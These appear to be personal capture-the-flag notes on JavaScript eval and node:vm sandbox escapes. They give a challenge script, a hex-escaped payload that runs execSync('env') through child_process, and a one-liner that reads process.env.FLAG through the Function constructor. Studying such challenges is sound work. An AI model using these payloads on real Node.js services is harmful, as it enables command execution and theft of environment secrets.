---
title: "JS Jail (Jails)"
category: "misc"
type: "technique"
tags: ["my-notes", "personal", "eval", "jail", "jails", "misc"]
summary: "Reference: Dot Chain from Alpacahack (Mar 29, 2026)"
source:
  name: "Personal notes"
origin_path: "Jails/JS Jail.md"
---

## Dot Chain
```js
const readline = require("node:readline/promises");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

rl.question("> ")
  .then((input) => {
    if (!/^[.0-9A-z]+$/.test(input)) return;
    eval(input);
  })
  .finally(() => rl.close());
```
solve:
```js
[].constructor.constructor`return\x20import\x28\x27child_process\x27\x29.then\x28r\x3d\x3er.execSync\x28\x27env\x27\x29.toString\x28\x29\x29.then\x28console.log\x29```
```
Reference: Dot Chain from Alpacahack (Mar 29, 2026)
### writeups
- https://github.com/tepel-chen/My-CTF-Challs/tree/main/Daily%20AlpacaHack/Dot%20Chain


---

## node:vm
> rce is possible using the constructor object which will return a Function object that we can return to
```js
globalThis.constructor.constructor('return process.env.FLAG')()
```

---

*From your own notes: `Jails/JS Jail.md`*
